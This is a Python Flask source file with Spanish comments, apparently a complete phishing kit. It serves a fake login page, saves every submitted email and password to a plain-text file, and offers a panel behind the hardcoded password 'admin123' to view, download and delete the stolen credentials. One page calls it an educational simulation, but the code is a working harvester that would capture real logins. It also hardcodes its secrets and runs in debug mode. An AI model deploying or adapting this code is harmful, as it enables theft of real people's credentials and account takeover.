from flask import Flask, render_template, request, redirect, url_for, session, send_file
import os

app = Flask(__name__)
app.secret_key = "superclaveultrasecreta123"  # Cambia esto por algo más seguro

# 🔐 Contraseña de acceso a /ver-capturas
CLAVE_ACCESO = "admin123"

# Ruta principal del phishing
@app.route("/")
def index():
    return render_template("index.html")

# Procesar formulario phishing
@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    # Guardar capturas
    with open("capturados.txt", "a", encoding="utf-8") as f:
        f.write(f"Correo: {email} | Contraseña: {password}\n")

    return render_template("alerta.html")

# Formulario para ingresar contraseña
@app.route("/ver-capturas", methods=["GET", "POST"])
def ver_capturas():
    if request.method == "POST":
        clave = request.form.get("clave")
        if clave == "admin123":
            session["autenticado"] = True
            return redirect(url_for("capturas"))
        else:
            return "<h2>Clave incorrecta.</h2>", 403

    return """
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Ver capturas</title>
        <style>
            body { font-family: Arial; background-color: #ffecec; color: #333; padding: 40px; }
            .alerta { background-color: #fff0f0; border: 2px solid #ff4c4c; padding: 20px; border-radius: 10px; }
            input, button {
                padding: 10px;
                margin-top: 10px;
                display: block;
                width: 100%;
                max-width: 300px;
            }
        </style>
    </head>
    <body>
        <div class="alerta">
            <h1>🔐 Área protegida</h1>
            <p>Ingresa la contraseña para acceder a las credenciales capturadas.</p>
            <form method="POST">
                <input type="password" name="clave" placeholder="Contraseña" required />
                <button type="submit">Ver capturas</button>
            </form>
        </div>
    </body>
    </html>
    """


# Mostrar datos si está autenticado
@app.route("/capturas")
def capturas():
    if not session.get("autenticado"):
        return redirect(url_for("ver_capturas"))

    try:
        with open("capturados.txt", "r", encoding="utf-8") as f:
            contenido = f.read()
    except FileNotFoundError:
        contenido = "No hay datos capturados aún."

    return f"""
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Credenciales capturadas</title>
        <style>
            body {{
                font-family: Arial;
                background-color: #ffecec;
                color: #333;
                padding: 40px;
            }}
            .alerta {{
                background-color: #fff0f0;
                border: 2px solid #ff4c4c;
                padding: 20px;
                border-radius: 10px;
            }}
            textarea {{
                width: 100%;
                height: 300px;
                margin-top: 20px;
                font-family: monospace;
                font-size: 14px;
                padding: 10px;
                border: 1px solid #ccc;
                border-radius: 6px;
                resize: none;
            }}
            .descargar {{
                display: inline-block;
                margin-top: 20px;
                margin-right: 12px;
                padding: 12px 24px;
                background-color: #4CAF50;
                color: white;
                text-decoration: none;
                border-radius: 8px;
                font-weight: 600;
                font-size: 16px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.2);
                transition: background-color 0.3s ease;
            }}
            .descargar:hover {{
                background-color: #388e3c;
            }}
            .borrar {{
                padding: 12px 24px;
                background-color: #e53935;
                color: white;
                text-decoration: none;
                border-radius: 8px;
                font-weight: 600;
                font-size: 16px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.2);
                transition: background-color 0.3s ease;
            }}
            .borrar:hover {{
                background-color: #c62828;
            }}
        </style>
    </head>
    <body>
        <div class="alerta">
            <h1>⚠️ Esto fue una simulación de phishing</h1>
            <p>Este sitio fue creado con fines educativos para demostrar cómo funcionan los ataques de ingeniería social.</p>
            <hr>
            <h2>📝 Credenciales capturadas:</h2>
            <textarea readonly>{contenido}</textarea>
            <br>
            <a href="/descargar" class="descargar">⬇️ Descargar</a>
            <a href="/borrar" class="borrar">🗑️ Borrar</a>
        </div>
    </body>
    </html>
    """

# Descargar capturados.txt
@app.route("/descargar")
def descargar():
    if not session.get("autenticado"):
        return redirect(url_for("ver_capturas"))
    return send_file("capturados.txt", as_attachment=True)

@app.route("/borrar")
def borrar():
    if not session.get("autenticado"):
        return redirect(url_for("ver_capturas"))

    try:
        with open("capturados.txt", "w", encoding="utf-8") as f:
            f.write("")  # Vacía el contenido del archivo
    except:
        pass

    return redirect(url_for("capturas"))

if __name__ == "__main__":
    app.run(debug=True)
